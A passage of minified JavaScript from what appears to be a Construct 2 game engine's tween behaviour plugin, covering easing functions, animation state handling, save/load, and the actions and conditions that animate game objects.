h(t,e,i,s){return(t/=s)<1/2.75?i*(7.5625*t*t)+e:t<2/2.75?i*(7.5625*(t-=1.5/2.75)*t+.75)+e:t<2.5/2.75?i*(7.5625*(t-=2.25/2.75)*t+.9375)+e:i*(7.5625*(t-=2.625/2.75)*t+.984375)+e}e.groupUpdateProgress=function(t){1<t&&(t=1),cr.lunarray_tweenProgress[this.group]=-1,cr.lunarray_tweenProgress[this.group]=t,cr.lunarray_tweenProgress[this.group]>=t&&(cr.lunarray_tweenProgress[this.group]=t)},e.groupSync=function(){""!=this.group&&(void 0===cr.lunarray_tweenGroup&&(cr.lunarray_tweenGroup={},cr.lunarray_tweenProgress={}),void 0===cr.lunarray_tweenGroup[this.group]&&(cr.lunarray_tweenGroup[this.group]=[],cr.lunarray_tweenProgress[this.group]=-1),-1==cr.lunarray_tweenGroup[this.group].indexOf(this)&&cr.lunarray_tweenGroup[this.group].push(this))},e.saveState=function(){this.tweenSaveWidth=this.inst.width,this.tweenSaveHeight=this.inst.height,this.tweenSaveAngle=this.inst.angle,this.tweenSaveOpacity=this.inst.opacity,this.tweenSaveX=this.inst.x,this.tweenSaveY=this.inst.y,this.tweenSaveValue=this.value},e.onCreate=function(){this.active=1===this.properties[0],this.tweened=this.properties[1],this.easing=this.properties[2],this.initial=this.properties[3],this.target=this.properties[4],this.duration=this.properties[5],this.wait=this.properties[6],this.playmode=this.properties[7],this.value=this.properties[8],this.coord_mode=this.properties[9],this.forceInit=1===this.properties[10],this.group=this.properties[11],this.targetObject=null,this.pingpongCounter=0,5==this.playmode&&(this.pingpongCounter=1),this.groupSync(),this.isPaused=!1,this.initialX=this.inst.x,this.initialY=this.inst.y,this.targetX=parseFloat(this.target.split(",")[0]),this.targetY=parseFloat(this.target.split(",")[1]),this.saveState(),this.tweenInitialX=0,this.tweenInitialY=0,this.tweenTargetX=0,this.tweenTargetY=0,this.tweenTargetAngle=0,this.ratio=this.inst.height/this.inst.width,this.reverse=!1,this.rewindMode=!1,this.doTweenX=!0,this.doTweenY=!0,this.loop=!1,this.initiating=0,this.cooldown=0,this.lastPlayMode=this.playmode,this.lastKnownValue=this.tweenInitialX,this.lastKnownX=this.tweenInitialX,this.lastKnownY=this.tweenInitialY,this.forceInit&&this.init(),""==this.initial&&(this.initial="current"),this.onStarted=!1,this.onStartedDone=!1,this.onWaitEnd=!1,this.onWaitEndDone=!1,this.onEnd=!1,this.onEndDone=!1,this.onCooldown=!1,this.onCooldownDone=!1,this.active&&this.init()},e.init=function(){this.onStarted=!1,""===this.initial&&(this.initial="current"),""===this.target&&(this.target="current");var t,e,i,s,n="current"===this.initial,r="current"===this.target,o="OBJ"===this.target;"OBJ"===this.target&&null!=this.targetObject&&(0==this.tweened?1==this.coord_mode?this.target=this.targetObject.x-this.inst.x+","+(this.targetObject.y-this.inst.y):this.target=this.targetObject.x+","+this.targetObject.y:1==this.tweened||2==this.tweened||3==this.tweened||7==this.tweened?1==this.coord_mode?this.target=(2==this.tweened?1:this.targetObject.width)+","+(3==this.tweened?1:this.targetObject.height):this.target=(2==this.tweened?1:this.targetObject.width/this.tweenSaveWidth)+","+(3==this.tweened?1:this.targetObject.height/this.tweenSaveHeight):4==this.tweened?1==this.coord_mode?this.target=cr.to_degrees(this.targetObject.angle-this.inst.angle)+"":this.target=cr.to_degrees(this.targetObject.angle)+"":5==this.tweened&&(1==this.coord_mode?this.target=100*(this.targetObject.opacity-this.inst.opacity)+"":this.target=100*this.targetObject.opacity+"")),0==this.tweened?(r&&(this.target=this.inst.x+","+this.inst.y),n?1==this.coord_mode?this.initial=this.inst.x+","+this.inst.y:this.initial=this.tweenSaveX+","+this.tweenSaveY:this.reverse||1!=this.playmode&&(this.inst.x=parseFloat(this.initial.split(",")[0]),this.inst.y=parseFloat(this.initial.split(",")[1])),1==this.coord_mode?(this.loop&&(this.inst.x=this.tweenSaveX,this.inst.y=this.tweenSaveY),this.initialX=this.inst.x,this.initialY=this.inst.y,this.reverse?(this.targetX=-parseFloat(this.target.split(",")[0]),this.targetY=-parseFloat(this.target.split(",")[1])):(this.targetX=parseFloat(this.target.split(",")[0]),this.targetY=parseFloat(this.target.split(",")[1])),this.tweenInitialX=this.initialX,this.tweenInitialY=this.initialY,this.tweenTargetX=this.tweenInitialX+this.targetX,this.tweenTargetY=this.tweenInitialY+this.targetY):(this.reverse?(this.inst.x=parseFloat(this.target.split(",")[0]),this.inst.y=parseFloat(this.target.split(",")[1]),this.targetX=this.tweenSaveX,this.targetY=this.tweenSaveY):(this.inst.x=this.tweenSaveX,this.inst.y=this.tweenSaveY,this.targetX=parseFloat(this.target.split(",")[0]),this.targetY=parseFloat(this.target.split(",")[1])),this.initialX=this.inst.x,this.initialY=this.inst.y,this.tweenInitialX=this.initialX,this.tweenInitialY=this.initialY,this.tweenTargetX=this.targetX,this.tweenTargetY=this.targetY,-6==this.playmode&&(this.tweenTargetX=this.tweenSaveX,this.tweenTargetY=this.tweenSaveY))):1==this.tweened||2==this.tweened||3==this.tweened?(r&&(this.target="1,1"),"current"==this.initial&&(this.initial="1,1"),this.initial=""+this.initial,this.target=""+this.target,2==this.tweened?(-1==this.initial.indexOf(",")&&(this.initial=parseFloat(this.initial)+",1"),-1==this.target.indexOf(",")&&(this.target=parseFloat(this.target)+",1")):3==this.tweened?(-1==this.initial.indexOf(",")&&(this.initial="1,"+parseFloat(this.initial)),-1==this.target.indexOf(",")&&(this.target="1,"+parseFloat(this.target))):(-1==this.initial.indexOf(",")&&(this.initial=parseFloat(this.initial)+","+parseFloat(this.initial)),-1==this.target.indexOf(",")&&(this.target=parseFloat(this.target)+","+parseFloat(this.target))),t=parseFloat(this.initial.split(",")[0]),e=parseFloat(this.initial.split(",")[1]),this.doTweenX=!0,0!=(i=parseFloat(this.target.split(",")[0]))&&!isNaN(i)||(this.doTweenX=!1),3==this.tweened&&(this.doTweenX=!1),this.doTweenY=!0,0!=(s=parseFloat(this.target.split(",")[1]))&&!isNaN(s)||(this.doTweenY=!1),2==this.tweened&&(this.doTweenY=!1),1==this.coord_mode?(this.loop&&(this.inst.width=this.tweenSaveWidth,this.inst.height=this.tweenSaveHeight),n||(this.reverse?(this.inst.width=this.inst.width*i,this.inst.height=this.inst.height*s):(this.inst.width=this.inst.width*t,this.inst.height=this.inst.height*e)),this.initialX=this.inst.width,this.initialY=this.inst.height,this.tweenInitialX=this.initialX,this.tweenInitialY=this.initialY,this.reverse?(this.targetX=this.initialX*t/i,this.targetY=this.initialY*e/s):(this.targetX=this.initialX*i,this.targetY=this.initialY*s)):(n||(this.reverse?(this.inst.width=this.tweenSaveWidth*i,this.inst.height=this.tweenSaveHeight*s):(this.inst.width=this.tweenSaveWidth*t,this.inst.height=this.tweenSaveHeight*e)),this.initialX=this.inst.width,this.initialY=this.inst.height,this.tweenInitialX=this.initialX,this.tweenInitialY=this.initialY,this.reverse?(this.targetX=this.tweenSaveWidth*t,this.targetY=this.tweenSaveHeight*e):(this.targetX=this.tweenSaveWidth*i,this.targetY=this.tweenSaveHeight*s)),this.tweenTargetX=this.targetX,this.tweenTargetY=this.targetY,-6==this.playmode&&(this.tweenTargetX=this.tweenSaveWidth*t,this.tweenTargetY=this.tweenSaveHeight*e)):4==this.tweened?(r&&(this.target=cr.to_degrees(this.inst.angle)),"current"!=this.initial&&(this.reverse||1!=this.playmode&&(this.inst.angle=cr.to_radians(parseFloat(this.initial.split(",")[0])))),1==this.coord_mode?(this.loop&&(this.inst.angle=this.tweenSaveAngle),this.initialX=this.inst.angle,this.reverse?this.targetX=this.inst.angle-cr.to_radians(parseFloat(this.target.split(",")[0])):this.targetX=this.inst.angle+cr.to_radians(parseFloat(this.target.split(",")[0]))):this.reverse?(this.inst.angle=cr.to_radians(parseFloat(this.target.split(",")[0])),this.initialX=this.inst.angle,this.targetX=this.tweenSaveAngle):(this.inst.angle=this.tweenSaveAngle,this.initialX=this.inst.angle,this.targetX=cr.to_radians(parseFloat(this.target.split(",")[0]))),this.tweenInitialX=this.initialX,this.tweenTargetX=cr.to_degrees(this.targetX),-6==this.playmode&&(this.tweenTargetX=cr.to_degrees(this.tweenSaveAngle)),this.tweenTargetAngle=cr.to_radians(this.tweenTargetX)):5==this.tweened?("current"==this.initial&&(this.initial=this.inst.opacity),r&&(this.target=""+this.inst.opacity),n||this.reverse||1!=this.playmode&&(this.inst.opacity=parseFloat(this.initial.split(",")[0])/100),1==this.coord_mode?(this.loop&&(this.inst.opacity=this.tweenSaveOpacity),this.initialX=this.inst.opacity,this.tweenInitialX=this.initialX,this.reverse?this.targetX=-parseFloat(this.target.split(",")[0])/100:this.targetX=parseFloat(this.target.split(",")[0])/100,this.tweenTargetX=this.tweenInitialX+this.targetX):(this.initialX=this.inst.opacity,this.reverse?(this.tweenInitialX=parseFloat(this.target.split(",")[0])/100,this.targetX=parseFloat(this.initial.split(",")[0])/100):(this.tweenInitialX=this.initialX,this.targetX=parseFloat(this.target.split(",")[0])/100),this.tweenTargetX=this.targetX),-6==this.playmode&&(this.tweenTargetX=this.tweenSaveOpacity)):6==this.tweened?(isNaN(this.value)&&(this.value=0),"current"==this.initial&&(this.initial=""+this.value),r&&(this.target=""+this.value),n||this.reverse||1!=this.playmode&&(this.value=parseFloat(this.initial.split(",")[0])),1==this.coord_mode?(this.loop&&(this.value=this.tweenSaveValue),n||(this.reverse?this.value=parseFloat(this.target.split(",")[0]):this.value=parseFloat(this.initial.split(",")[0])),this.initialX=this.value,this.reverse?this.targetX=this.initialX-parseFloat(this.target.split(",")[0]):this.targetX=this.initialX+parseFloat(this.target.split(",")[0])):(n||(this.reverse?this.value=parseFloat(this.target.split(",")[0]):this.value=parseFloat(this.initial.split(",")[0])),this.initialX=this.value,this.reverse?this.targetX=parseFloat(this.initial.split(",")[0]):this.targetX=parseFloat(this.target.split(",")[0])),this.tweenInitialX=this.initialX,this.tweenTargetX=this.targetX,-6==this.playmode&&(this.tweenTargetX=this.tweenSaveValue)):7==this.tweened&&(r&&(this.target=this.inst.width+","+this.inst.height),"current"!=this.initial&&(this.reverse||1!=this.playmode&&(this.inst.width=parseFloat(this.initial.split(",")[0]),this.inst.height=parseFloat(this.initial.split(",")[1]))),this.doTweenX=!0,((i=parseFloat(this.target.split(",")[0]))<0||isNaN(i))&&(this.doTweenX=!1),this.doTweenY=!0,((s=parseFloat(this.target.split(",")[1]))<0||isNaN(s))&&(this.doTweenY=!1),1==this.coord_mode?(this.loop&&(this.inst.width=this.tweenSaveWidth,this.inst.height=this.tweenSaveHeight),this.initialX=this.inst.width,this.initialY=this.inst.height,this.reverse?(this.targetX=this.initialX-parseFloat(this.target.split(",")[0]),this.targetY=this.initialY-parseFloat(this.target.split(",")[1])):(this.targetX=this.initialX+parseFloat(this.target.split(",")[0]),this.targetY=this.initialY+parseFloat(this.target.split(",")[1]))):(n||(this.reverse?(this.inst.width=parseFloat(this.target.split(",")[0]),this.inst.height=parseFloat(this.target.split(",")[1])):(this.inst.width=this.tweenSaveWidth,this.inst.height=this.tweenSaveHeight)),this.initialX=this.inst.width,this.initialY=this.inst.height,this.reverse?(this.targetX=this.tweenSaveWidth,this.targetY=this.tweenSaveHeight):(this.targetX=parseFloat(this.target.split(",")[0]),this.targetY=parseFloat(this.target.split(",")[1]))),this.tweenInitialX=this.initialX,this.tweenInitialY=this.initialY,this.tweenTargetX=this.targetX,this.tweenTargetY=this.targetY,-6==this.playmode&&(this.tweenTargetX=this.tweenSaveWidth,this.tweenTargetY=this.tweenSaveHeight)),this.lastKnownValue=this.tweenInitialX,this.lastKnownX=this.tweenInitialX,this.lastKnownY=this.tweenInitialY,this.initiating=parseFloat(this.wait.split(",")[0]),this.cooldown=parseFloat(this.wait.split(",")[1]),(this.initiating<0||isNaN(this.initiating))&&(this.initiating=0),(this.cooldown<0||isNaN(this.cooldown))&&(this.cooldown=0),n&&(this.initial="current"),r&&(this.target="current"),o&&(this.target="OBJ")},e.easeFunc=function(t,e,i,s){switch(this.easing){case 0:return i*t/s+e;case 1:return i*(t/=s)*t+e;case 2:return-i*(t/=s)*(t-2)+e;case 3:return(t/=s/2)<1?i/2*t*t+e:-i/2*(--t*(t-2)-1)+e;case 4:return i*(t/=s)*t*t+e;case 5:return i*((t=t/s-1)*t*t+1)+e;case 6:return(t/=s/2)<1?i/2*t*t*t+e:i/2*((t-=2)*t*t+2)+e;case 7:return i*(t/=s)*t*t*t+e;case 8:return-i*((t=t/s-1)*t*t*t-1)+e;case 9:return(t/=s/2)<1?i/2*t*t*t*t+e:-i/2*((t-=2)*t*t*t-2)+e;case 10:return i*(t/=s)*t*t*t*t+e;case 11:return i*((t=t/s-1)*t*t*t*t+1)+e;case 12:return(t/=s/2)<1?i/2*t*t*t*t*t+e:i/2*((t-=2)*t*t*t*t+2)+e;case 13:return-i*(Math.sqrt(1-(t/=s)*t)-1)+e;case 14:return i*Math.sqrt(1-(t=t/s-1)*t)+e;case 15:return(t/=s/2)<1?-i/2*(Math.sqrt(1-t*t)-1)+e:i/2*(Math.sqrt(1-(t-=2)*t)+1)+e;case 16:return 0==(o=0)&&(o=1.70158),i*(t/=s)*t*((o+1)*t-o)+e;case 17:return 0==(o=0)&&(o=1.70158),i*((t=t/s-1)*t*((o+1)*t+o)+1)+e;case 18:return 0==(o=0)&&(o=1.70158),(t/=s/2)<1?i/2*(t*t*((1+(o*=1.525))*t-o))+e:i/2*((t-=2)*t*((1+(o*=1.525))*t+o)+2)+e;case 19:return 0==t?e:1==(t/=s)?e+i:(0==(r=0)&&(r=.3*s),o=0==(n=0)||n<Math.abs(i)?(n=i,r/4):r/(2*Math.PI)*Math.asin(i/n),-(n*Math.pow(2,10*--t)*Math.sin((t*s-o)*(2*Math.PI)/r))+e);case 20:return 0==t?e:1==(t/=s)?e+i:(0==(r=0)&&(r=.3*s),o=0==(n=0)||n<Math.abs(i)?(n=i,r/4):r/(2*Math.PI)*Math.asin(i/n),n*Math.pow(2,-10*t)*Math.sin((t*s-o)*(2*Math.PI)/r)+i+e);case 21:var n,r,o;return 0==t?e:2==(t/=s/2)?e+i:(0==(r=0)&&(r=s*(.3*1.5)),o=0==(n=0)||n<Math.abs(i)?(n=i,r/4):r/(2*Math.PI)*Math.asin(i/n),t<1?n*Math.pow(2,10*--t)*Math.sin((t*s-o)*(2*Math.PI)/r)*-.5+e:n*Math.pow(2,-10*--t)*Math.sin((t*s-o)*(2*Math.PI)/r)*.5+i+e);case 22:return i-h(s-t,0,i,s)+e;case 23:return h(t,e,i,s);case 24:return t<s/2?.5*(i-h(s-2*t,0,i,s)+e)+e:.5*h(2*t-s,0,i,s)+.5*i+e;case 25:return(a=t/s/2)*a*(3-2*a)*2;case 26:return(a=(t/s+1)/2)*a*(3-2*a)*2-1;case 27:var a;return(a=t/s)*a*(3-2*a)}return 0},e.saveToJSON=function(){return{i:this.i,active:this.active,tweened:this.tweened,easing:this.easing,initial:this.initial,target:this.target,duration:this.duration,wait:this.wait,playmode:this.playmode,value:this.value,coord_mode:this.coord_mode,forceInit:this.forceInit,group:this.group,targetObject:this.targetObject,pingpongCounter:this.pingpongCounter,isPaused:this.isPaused,initialX:this.initialX,initialY:this.initialY,targetX:this.targetX,targetY:this.targetY,tweenSaveWidth:this.tweenSaveWidth,tweenSaveHeight:this.tweenSaveHeight,tweenSaveAngle:this.tweenSaveAngle,tweenSaveX:this.tweenSaveX,tweenSaveY:this.tweenSaveY,tweenSaveValue:this.tweenSaveValue,tweenInitialX:this.tweenInitialX,tweenInitialY:this.tweenInitialY,tweenTargetX:this.tweenTargetX,tweenTargetY:this.tweenTargetY,tweenTargetAngle:this.tweenTargetAngle,ratio:this.ratio,reverse:this.reverse,rewindMode:this.rewindMode,doTweenX:this.doTweenX,doTweenY:this.doTweenY,loop:this.loop,initiating:this.initiating,cooldown:this.cooldown,lastPlayMode:this.lastPlayMode,lastKnownValue:this.lastKnownValue,lastKnownX:this.lastKnownX,lastKnownY:this.lastKnownY,onStarted:this.onStarted,onStartedDone:this.onStartedDone,onWaitEnd:this.onWaitEnd,onWaitEndDone:this.onWaitEndDone,onEnd:this.onEnd,onEndDone:this.onEndDone,onCooldown:this.onCooldown,onCooldownDone:this.onCooldownDone}},e.loadFromJSON=function(t){this.i=t.i,this.active=t.active,this.tweened=t.tweened,this.easing=t.easing,this.initial=t.initial,this.target=t.target,this.duration=t.duration,this.wait=t.wait,this.playmode=t.playmode,this.value=t.value,this.coord_mode=t.coord_mode,this.forceInit=t.forceInit,this.group=t.group,this.targetObject=t.targetObject,this.pingpongCounter=t.pingpongCounter,this.isPaused=t.isPaused,this.initialX=t.initialX,this.initialY=t.initialY,this.targetX=t.targetX,this.targetY=t.targetY,this.tweenSaveWidth=t.tweenSaveWidth,this.tweenSaveHeight=t.tweenSaveHeight,this.tweenSaveAngle=t.tweenSaveAngle,this.tweenSaveX=t.tweenSaveX,this.tweenSaveY=t.tweenSaveY,this.tweenSaveValue=t.tweenSaveValue,this.tweenInitialX=t.tweenInitialX,this.tweenInitialY=t.tweenInitialY,this.tweenTargetX=t.tweenTargetX,this.tweenTargetY=t.tweenTargetY,this.tweenTargetAngle=t.tweenTargetAngle,this.ratio=t.ratio,this.reverse=t.reverse,this.rewindMode=t.rewindMode,this.doTweenX=t.doTweenX,this.doTweenY=t.doTweenY,this.loop=t.loop,this.initiating=t.initiating,this.cooldown=t.cooldown,this.lastPlayMode=t.lastPlayMode,this.lastKnownValue=t.lastKnownValue,this.lastKnownX=t.lastKnownX,this.lastKnownY=t.lastKnownY,this.onStarted=t.onStarted,this.onStartedDone=t.onStartedDone,this.onWaitEnd=t.onWaitEnd,this.onWaitEndDone=t.onWaitEndDone,this.onEnd=t.onEnd,this.onEndDone=t.onEndDone,this.onCooldown=t.onCooldown,this.onCooldownDone=t.onCooldownDone,this.groupSync()},e.tick=function(){var t,e=this.runtime.getDt(this.inst),i=-1==this.i;this.active&&0!==e&&(0==this.i&&(this.onStarted||(this.onStarted=!0,this.onStartedDone=!1,this.onWaitEnd=!1,this.onWaitEndDone=!1,this.onEnd=!1,this.onEndDone=!1,this.onCooldown=!1,this.onCooldownDone=!1,this.runtime.trigger(cr.behaviors.lunarray_Tween.prototype.cnds.OnStart,this.inst),this.onStartedDone=!0)),-1==this.i?this.i=this.initiating+this.duration+this.cooldown:this.i+=e,this.i<=this.initiating||(0==this.onWaitEnd&&(this.onWaitEnd=!0,this.runtime.trigger(cr.behaviors.lunarray_Tween.prototype.cnds.OnWaitEnd,this.inst),this.onWaitEndDone=!0),this.i<=this.duration+this.initiating&&(t=this.easeFunc(this.i-this.initiating,0,1,this.duration),0==this.tweened?(1==this.coord_mode?(this.inst.x!==this.lastKnownX&&(this.tweenInitialX+=this.inst.x-this.lastKnownX,this.tweenTargetX+=this.inst.x-this.lastKnownX),this.inst.y!==this.lastKnownY&&(this.tweenInitialY+=this.inst.y-this.lastKnownY,this.tweenTargetY+=this.inst.y-this.lastKnownY)):(this.inst.x!==this.lastKnownX&&(this.tweenInitialX+=this.inst.x-this.lastKnownX),this.inst.y!==this.lastKnownY&&(this.tweenInitialY+=this.inst.y-this.lastKnownY)),this.inst.x=this.tweenInitialX+(this.tweenTargetX-this.tweenInitialX)*t,this.inst.y=this.tweenInitialY+(this.tweenTargetY-this.tweenInitialY)*t,this.lastKnownX=this.inst.x,this.lastKnownY=this.inst.y):1==this.tweened||2==this.tweened||3==this.tweened?(this.inst.width!==this.lastKnownX&&(this.tweenInitialX=this.inst.width),this.inst.height!==this.lastKnownY&&(this.tweenInitialY=this.inst.height),this.doTweenX&&(this.inst.width=this.tweenInitialX+(this.tweenTargetX-this.tweenInitialX)*t),this.doTweenY?this.inst.height=this.tweenInitialY+(this.tweenTargetY-this.tweenInitialY)*t:1==this.tweened&&(this.inst.height=this.inst.width*this.ratio),this.lastKnownX=this.inst.width,this.lastKnownY=this.inst.height):4==this.tweened?(e=this.tweenInitialX+(this.tweenTargetAngle-this.tweenInitialX)*t,this.i>=this.duration+this.initiating&&(e=this.tweenTargetAngle),this.inst.angle=cr.clamp_angle(e)):5==this.tweened?(1==this.coord_mode&&this.inst.opacity!==this.lastKnownX&&(this.tweenInitialX=this.inst.opacity),this.inst.opacity=this.tweenInitialX+(this.tweenTargetX-this.tweenInitialX)*t,this.lastKnownX=this.inst.opacity):6==this.tweened?this.value=this.tweenInitialX+(this.tweenTargetX-this.tweenInitialX)*t:7==this.tweened&&(1==this.coord_mode&&(this.inst.width!==this.lastKnownX&&(this.tweenInitialX=this.inst.width),this.inst.height!==this.lastKnownY&&(this.tweenInitialY=this.inst.height)),this.doTweenX&&(this.inst.width=this.tweenInitialX+(this.tweenTargetX-this.tweenInitialX)*t),this.doTweenY&&(this.inst.height=this.tweenInitialY+(this.tweenTargetY-this.tweenInitialY)*t),this.lastKnownX=this.inst.width,this.lastKnownY=this.inst.height),this.inst.set_bbox_changed()),this.i>=this.duration+this.initiating&&(this.doEndFrame(i),this.inst.set_bbox_changed(),0==this.onEnd&&(this.onEnd=!0,this.runtime.trigger(cr.behaviors.lunarray_Tween.prototype.cnds.OnEnd,this.inst),this.onEndDone=!0))))},e.doEndFrame=function(t){switch(this.tweened){case 0:this.inst.x=this.tweenTargetX,this.inst.y=this.tweenTargetY;break;case 1:this.doTweenX&&(this.inst.width=this.tweenTargetX),this.doTweenY?this.inst.height=this.tweenTargetY:this.inst.height=this.inst.width*this.ratio;break;case 2:this.inst.width=this.tweenTargetX;break;case 3:this.inst.height=this.tweenTargetY;break;case 4:var e=this.tweenTargetAngle;this.inst.angle=cr.clamp_angle(e),this.lastKnownValue=this.inst.angle;break;case 5:this.inst.opacity=this.tweenTargetX;break;case 6:this.value=this.tweenTargetX;break;case 7:this.doTweenX&&(this.inst.width=this.tweenTargetX),this.doTweenY&&(this.inst.height=this.tweenTargetY)}this.i>=this.duration+this.initiating+this.cooldown&&(0==this.playmode?(this.active=!1,this.reverse=!1,this.i=this.duration+this.initiating+this.cooldown):1==this.playmode?(this.i=0,this.init(),this.active=!0):2==this.playmode?t?(this.reverse=!1,this.init()):(this.reverse=!this.reverse,this.i=0,this.init(),this.active=!0):3==this.playmode?this.runtime.DestroyInstance(this.inst):4==this.playmode?(this.loop=!0,this.i=0,this.init(),this.active=!0):5==this.playmode?t?(this.reverse=!1,this.init()):this.pingpongCounter<=0?(this.i=this.duration+this.initiating+this.cooldown,this.active=!1):(this.reverse?(--this.pingpongCounter,this.reverse=!1):(--this.pingpongCounter,this.reverse=!0),this.i=0,this.init(),this.active=!0):-6==this.playmode?(this.playmode=this.lastPlayMode,this.reverse=!1,this.i=0,this.active=!1):6==this.playmode&&(this.reverse=!1,this.i=this.duration+this.initiating+this.cooldown,this.active=!1)),0==this.onCooldown&&(this.onCooldown=!0,this.runtime.trigger(cr.behaviors.lunarray_Tween.prototype.cnds.OnCooldownEnd,this.inst),this.onCooldownDone=!0)},t.cnds={},(e=t.cnds).IsActive=function(){return this.active},e.CompareGroupProgress=function(t,e){var i=[];return cr.lunarray_tweenGroup[this.group].forEach(function(t){i.push(t.i/(t.duration+t.initiating+t.cooldown))}),cr.do_cmp(Math.min.apply(null,i),t,e)},e.CompareProgress=function(t,e){return cr.do_cmp(this.i/(this.duration+this.initiating+this.cooldown),t,e)},e.OnStart=function(){if(!1===this.onStartedDone)return this.onStarted},e.OnWaitEnd=function(){if(!1===this.onWaitEndDone)return this.onWaitEnd},e.OnEnd=function(t,e,i){if(!1===this.onEndDone)return this.onEnd},e.OnCooldownEnd=function(){if(!1===this.onCooldownDone)return this.onCooldown},t.acts={};var c=t.acts;c.SetActive=function(t){this.active=1===t},c.StartGroup=function(e,t){""===t&&(t=this.group),1!==e&&!cr.lunarray_tweenGroup[t].every(function(t){return!t.active})||cr.lunarray_tweenGroup[t].forEach(function(t){(1===e?c.Force:c.Start).apply(t)})},c.StopGroup=function(e,t){""===t&&(t=this.group),cr.lunarray_tweenGroup[t].forEach(function(t){c.Stop.apply(t,[e])})},c.ReverseGroup=function(e,i,t){""===t&&(t=this.group),1!==e&&!cr.lunarray_tweenGroup[t].every(function(t){return!t.active})||cr.lunarray_tweenGroup[t].forEach(function(t){(1===e?c.ForceReverse:c.Reverse).apply(t,[i])})},c.Force=function(){this.loop=4===this.playmode,5==this.playmode&&(this.pingpongCounter=1),6==this.playmode||-6==this.playmode?this.i<this.duration+this.cooldown+this.initiating&&(this.reverse=!1,this.init(),this.active=!0):(this.reverse=!1,this.i=0,this.init(),this.active=!0)},c.ForceReverse=function(t){this.rewindMode=1==t,this.loop=4===this.playmode,5==this.playmode&&(this.pingpongCounter=1),6==this.playmode||-6==this.playmode?this.i<this.duration+this.cooldown+this.initiating&&(this.reverse=!0,this.init(),this.active=!0):t?1==this.pingpongCounter&&this.i>=this.duration+this.cooldown+this.initiating&&(this.reverse=!0,this.i=0,this.pingpongCounter=2,this.init(),this.active=!0):(this.reverse=!0,this.i=0,this.init(),this.active=!0)},c.Start=function(){this.active||(this.loop=4===this.playmode,5==this.playmode&&(this.pingpongCounter=1),6==this.playmode||-6==this.playmode?this.i<this.duration+this.cooldown+this.initiating&&(this.reverse=!1,this.init(),this.active=!0):(this.pingpongCounter=1,this.reverse=!1,this.i=0,this.init(),this.active=!0))},c.Stop=function(t){this.active&&(2==this.playmode||4==this.playmode?this.reverse?this.i=0:this.i=-1:1==t?this.saveState():this.i=0==t?this.initiating+this.cooldown+this.duration:0,this.tick(),this.active=!1)},c.Pause=function(){this.active&&(this.isPaused=!0,this.active=!1)},c.Resume=function(){this.isPaused?(this.active=!0,this.isPaused=!1):this.active||(this.reverse=!1,this.i=0,this.init(),this.active=!0)},c.Reverse=function(t){this.rewindMode=1==t,this.active||(this.loop=4===this.playmode,5==this.playmode&&(this.pingpongCounter=1),6==this.playmode||-6==this.playmode?this.i<this.duration+this.cooldown+this.initiating&&(this.reverse=!0,this.init(),this.active=!0):t?1==this.pingpongCounter&&this.i>=this.duration+this.cooldown+this.initiating&&(this.reverse=!0,this.i=0,this.pingpongCounter=2,this.init(),this.active=!0):(this.reverse=!0,this.i=0,this.init(),this.active=!0))},c.SetDuration=function(t){this.duration=t},c.SetWait=function(t){this.wait=t,this.initiating=parseFloat(this.wait.split(",")[0]),this.cooldown=parseFloat(this.wait.split(",")[1]),(this.initiating<0||isNaN(this.initiating))&&(this.initiating=0),(this.cooldown<0||isNaN(this.cooldown))&&(this.cooldown=0)},c.SetTarget=function(t){"string"==typeof t?(this.target=t,this.targetX=parseFloat(t.split(",")[0]),this.targetY=parseFloat(t.split(",")[1])):(this.target=t,this.targetX=t),this.active||this.init()},c.SetTargetObject=function(t){!t||(t=t.getFirstPicked())&&(this.targetObject=t,this.target="OBJ")},c.SetTargetX=function(t){var e;2==this.tweened||3==this.tweened||4==this.tweened||5==this.tweened||6==this.tweened?(this.target="string"==typeof t?parseFloat(t.split(",")[0]):t+","+this.targetY,this.targetX=this.target):(e=this.target.split(",")[1],this.target=String(t)+","+e,this.targetX=parseFloat(this.target.split(",")[0]),this.targetY=parseFloat(this.target.split(",")[1])),this.active||(this.saveState(),this.init())},c.SetTargetY=function(t){var e;2==this.tweened||3==this.tweened||4==this.tweened||5==this.tweened||6==this.tweened?(this.target="string"==typeof t?parseFloat(t)+"":this.targetX+","+t,this.targetX=this.target):(e=this.target.split(",")[0],this.target=e+","+String(t),this.targetX=parseFloat(this.target.split(",")[0]),this.targetY=parseFloat(this.target.split(",")[1])),this.active||(this.saveState(),this.init())},c.SetInitial=function(t){"string"==typeof t?(this.initial=t,this.initialX=parseFloat(t.split(",")[0]),this.initialY=parseFloat(t.split(",")[1])):(this.initial=""+t,this.initialX=t),6==this.tweened&&(this.value=this.initialX),this.active||(this.saveState(),this.init())},c.SetInitialX=function(t){var e;2==this.tweened||3==this.tweened||4==this.tweened||5==this.tweened||6==this.tweened?(this.initial="string"==typeof t?parseFloat(t):t+","+this.initialY,this.initialX=this.initial):(""==this.initial&&(this.initial="current"),e="current"==this.initial?this.tweenSaveY:this.initial.split(",")[1],this.initial=String(t)+","+e,this.initialX=parseFloat(this.initial.split(",")[0]),this.initialY=parseFloat(this.initial.split(",")[1])),6==this.tweened&&(this.value=this.initialX),this.active||(this.saveState(),this.init())},c.SetInitialY=function(t){var e;2==this.tweened||3==this.tweened||4==this.tweened||5==this.tweened||6==this.tweened?(this.initial="string"==typeof t?parseFloat(t):this.initialX+","+t,this.initialX=this.initial):(""==this.initial&&(this.initial="current"),e="current"==this.initial?this.tweenSaveX:this.initial.split(",")[0],this.initial=e+","+String(t),this.initialX=parseFloat(this.initial.split(",")[0]),this.initialY=parseFloat(this.initial.split(",")[1])),this.active||(this.saveState(),this.init())},c.SetValue=function(t){this.value=t},c.SetTweenedProperty=function(t){this.tweened=t},c.SetEasing=function(t){this.easing=t},c.SetPlayback=function(t){this.playmode=t},c.SetParameter=function(t,e,i,s,n,r,o,a){this.tweened=t,this.playmode=e,this.easing=i,c.SetInitial.apply(this,[s]),c.SetTarget.apply(this,[n]),c.SetDuration.apply(this,[r]),c.SetWait.apply(this,[o]),this.coord_mode=a,this.saveState()},t.exps={},(t=t.exps).Progress=function(t){t.set_float(this.i/(this.duration+this.initiating+this.cooldown))},t.ProgressTime=function(t){t.set_float(this.i)},t.Duration=function(t){t.set_float(this.duration)},t.Initiating=function(t){t.set_float(this.initiating)},t.Cooldown=function(t){t.set_float(this.cooldown)},t.Target=function(t){t.set_string(this.target)},t.Value=function(t){t.set_float(this.value)},t.isPaused=function(t){t.set_int(this.isPaused?1:0)}}(),cr.behaviors.scrollto=function(t){this.runtime=t,this.shakeMag=0,this.shakeStart=0,this.shakeEnd=0,this.shakeMode=0},function(){var 